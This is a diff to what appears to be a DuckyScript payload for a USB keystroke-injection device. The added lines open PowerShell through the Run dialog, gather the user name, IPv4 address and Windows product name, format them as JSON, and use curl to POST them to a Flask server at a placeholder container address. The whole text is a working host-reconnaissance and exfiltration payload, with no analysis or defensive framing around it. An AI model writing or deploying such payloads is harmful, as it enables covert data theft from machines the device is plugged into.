@@ -1,7 +1,23 @@
-ATTACKMODE HID
-LED_OFF
-DELAY 2000
+REM Open the terminal (Windows example with PowerShell, for Linux, adjust as needed)
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
 
-SAVE_HOST_KEYBOARD_LOCK_STATE
-$_EXFIL_MODE_ENABLED = TRUE
-$_EXFIL_LEDS_ENABLED = TRUE
+REM Collect the username, IP, and operating system
+STRING $user = $env:UserName
+ENTER
+STRING $ip = (Get-NetIPAddress -AddressFamily IPv4).IPAddress
+ENTER
+STRING $os = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ProductName
+ENTER
+
+REM Combine data into JSON format
+STRING $data = "{`"user`":`"$user`",`"ip`":`"$ip`",`"os`":`"$os`"}"
+ENTER
+
+REM Send data to the Flask server
+STRING curl -X POST http://<docker_container_ip>:5000/receive -H "Content-Type: application/json" -d $data
+ENTER
